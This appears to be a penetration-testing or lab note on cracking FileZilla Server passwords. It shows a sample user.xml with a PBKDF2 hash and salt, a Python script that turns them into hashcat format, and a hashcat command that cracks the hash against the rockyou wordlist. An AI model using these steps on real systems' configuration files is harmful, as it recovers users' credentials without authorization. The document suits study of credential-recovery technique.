Example below shows the Filezilla `user.xml`. 

```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<filezilla xmlns:fz="https://filezilla-project.org" xmlns="https://filezilla-project.org" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" fz:product_flavour="standard" fz:product_version="1.8.0">
	<default_impersonator index="0" enabled="false">
		<name></name>
		<password></password>
	</default_impersonator>
	<user name="&lt;system user>" enabled="false">
		<mount_point tvfs_path="/" access="1" native_path="" new_native_path="%&lt;home>" recursive="2" flags="0" />
		<rate_limits inbound="unlimited" outbound="unlimited" session_inbound="unlimited" session_outbound="unlimited" />
		<allowed_ips></allowed_ips>
		<disallowed_ips></disallowed_ips>
		<session_open_limits files="unlimited" directories="unlimited" />
		<session_count_limit>unlimited</session_count_limit>
		<description>This user can impersonate any system user.</description>
		<impersonation login_only="false" />
		<methods>1</methods>
	</user>
	<user name="backup" enabled="true">
		<mount_point tvfs_path="/" access="1" native_path="" new_native_path="E:\Private" recursive="2" flags="0" />
		<rate_limits inbound="unlimited" outbound="unlimited" session_inbound="unlimited" session_outbound="unlimited" />
		<allowed_ips></allowed_ips>
		<disallowed_ips></disallowed_ips>
		<session_open_limits files="unlimited" directories="unlimited" />
		<session_count_limit>unlimited</session_count_limit>
		<description></description>
		<password index="1">
			<hash>ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU</hash>
			<salt>aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw</salt>
			<iterations>100000</iterations>
		</password>
		<methods>1</methods>
	</user>
	<user name="ftp" enabled="true">
		<mount_point tvfs_path="/" access="1" native_path="" new_native_path="E:\Public" recursive="2" flags="0" />
		<rate_limits inbound="unlimited" outbound="unlimited" session_inbound="unlimited" session_outbound="unlimited" />
		<allowed_ips></allowed_ips>
		<disallowed_ips></disallowed_ips>
		<session_open_limits files="unlimited" directories="unlimited" />
		<session_count_limit>unlimited</session_count_limit>
		<description></description>
		<password index="0" />
		<methods>0</methods>
	</user>
</filezilla>
```

We hand to extract the hash for the backup user's account. It can be done with the following script:

```bash
#!/usr/bin/env python3
import argparse
import base64
import binascii

def fix_b64(s):
    return s + '=' * (-len(s) % 4)

def to_hex(value, encoding):
    if encoding == "hex":
        return value.lower()
    elif encoding == "base64":
        return binascii.hexlify(base64.b64decode(fix_b64(value))).decode()
    elif encoding == "raw":
        return binascii.hexlify(value.encode()).decode()
    else:
        raise ValueError("Unsupported encoding")

parser = argparse.ArgumentParser(description="Generic PBKDF2-SHA256 to Hashcat 10900 formatter")
parser.add_argument("--hash", required=True, help="Hash value")
parser.add_argument("--salt", required=True, help="Salt value")
parser.add_argument("--iterations", required=True, help="Iteration count")
parser.add_argument("--hash-enc", required=True, choices=["hex", "base64"], help="Hash encoding")
parser.add_argument("--salt-enc", required=True, choices=["hex", "base64", "raw"], help="Salt encoding")

args = parser.parse_args()

salt_hex = to_hex(args.salt, args.salt_enc)
hash_hex = to_hex(args.hash, args.hash_enc)

print(f"sha256:{args.iterations}:{salt_hex}:{hash_hex}")
```

Usage:

```bash
python3 script.py --hash ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU --salt 'aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw' --iterations 100000 --hash-enc base64 --salt-enc base64
```

Then crack:

```bash
hashcat -m 10900 hash.txt /opt/rockyou.txt
```